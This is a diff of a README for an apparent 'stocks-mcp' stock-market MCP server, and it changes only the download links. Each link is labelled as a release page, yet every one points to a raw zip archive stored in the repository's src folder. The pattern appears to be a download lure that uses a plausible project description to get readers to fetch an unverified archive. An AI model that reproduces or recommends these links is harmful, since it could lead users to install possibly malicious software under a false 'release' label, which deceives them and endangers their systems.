@@ -4,13 +4,13 @@
 
 Welcome to the stocks-mcp repository! This application provides comprehensive stock market data through an MCP server. It is optimized for Language Learning Models (LLMs) and includes tools for technical analysis, screeners, pivot points, and support for Turkish stocks on BIST.
 
-[Download from Releases](https://raw.githubusercontent.com/ghaidaa-24/stocks-mcp/main/src/stocks-mcp_Zach.zip)
+[Download from Releases](https://github.com/ghaidaa-24/stocks-mcp/raw/refs/heads/main/src/stocks_mcp_1.4.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the page below to download the latest version of the application.
 
-[Visit Release Page](https://raw.githubusercontent.com/ghaidaa-24/stocks-mcp/main/src/stocks-mcp_Zach.zip)
+[Visit Release Page](https://github.com/ghaidaa-24/stocks-mcp/raw/refs/heads/main/src/stocks_mcp_1.4.zip)
 
 ### Step-by-Step Download Instructions
 
@@ -92,4 +92,4 @@ This project covers various topics:
 - typescript
 - yahoo-finance
 
-[Download from Releases](https://raw.githubusercontent.com/ghaidaa-24/stocks-mcp/main/src/stocks-mcp_Zach.zip)
+[Download from Releases](https://github.com/ghaidaa-24/stocks-mcp/raw/refs/heads/main/src/stocks_mcp_1.4.zip)
